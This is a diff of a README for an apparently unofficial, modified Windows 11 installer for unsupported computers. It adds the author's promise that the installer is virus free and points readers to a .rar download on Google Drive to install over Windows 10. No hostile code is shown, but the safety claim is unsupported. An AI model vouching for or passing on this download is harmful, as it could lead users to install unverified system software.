@@ -1,9 +1,19 @@
 <h1 align="center">Windows 11 for unsupported devices</h1>
 
-<h3>Downloading .rar file:</h3>
+<h3>About:</h3>
+<a>Hi, I have modified the Windows 11 installer so that it can be installed on older computers. I guarantee this installer is virus free</a>
+<br>
+<h6>** Please back up your data before upgrading the system. I am not responsible for the loss of files.</h6>
+
+<h2>Downloading .rar file:</h2>
 <ul>
   <li><a>Download from </a><a href="https://drive.google.com/u/0/uc?export=download&confirm=ZuoG&id=1jQdRmUnrm1aW3J2DSMfznMAXzO9ozzq-">Google Drive</li>
 </ul>
+<br>
+
+
+
+
 <br>
 
 <h2 align="center">System Requirements: (Minimal)</h2>
@@ -18,7 +28,6 @@
 <p>(** An internet connection is required to configure the system)</p>
 
 <h2 align="center">How to install this version of Windows 11 on my computer?</h2>
-  <p>(** Please back up your data before upgrading the system. I am not responsible for the loss of files.)</p>
   <h3>If you're already have Windows 10</h3>
    <ol>  
      <li><a>Download Windows11.rar file, move it to your desktop, and unpack it.</a></li>
